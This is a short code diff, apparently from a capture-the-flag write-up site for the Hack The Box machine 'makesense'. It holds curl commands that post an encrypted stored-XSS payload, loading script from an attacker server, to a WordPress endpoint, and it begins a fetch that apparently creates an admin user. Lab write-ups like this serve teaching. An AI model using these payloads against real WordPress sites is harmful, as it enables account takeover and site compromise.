@@ -47,7 +47,7 @@ data=json.dumps({"transcription":sys.argv[1],"summary":sys.argv[1]}).encode()
 print(base64.b64encode(iv+AESGCM(key).encrypt(iv,data,None)).decode())`;
 
 const cbXss = `PID=$(curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php -d "action=submit_contact_form" -d "nonce=NONCE" -d "name=a" -d "email=a@a.com" -d "message=v" | grep -oE '"post_id":[0-9]+' | cut -d: -f2)
-ENC=$(python3 encrypt.py "<script src=SERVIDOR/x.js></script>")
+ENC=$(python3 encrypt.py "<` + `script src=SERVIDOR/x.js></` + `script>")
 curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php -F "action=save_voice_results" -F "nonce=NONCE" -F "post_id=$PID" -F "encrypted_payload=$ENC"`;
 
 const cbCreateAdmin = `fetch('/wp-admin/user-new.php',{credentials:'include'}).then(r=>r.text()).then(h=>{
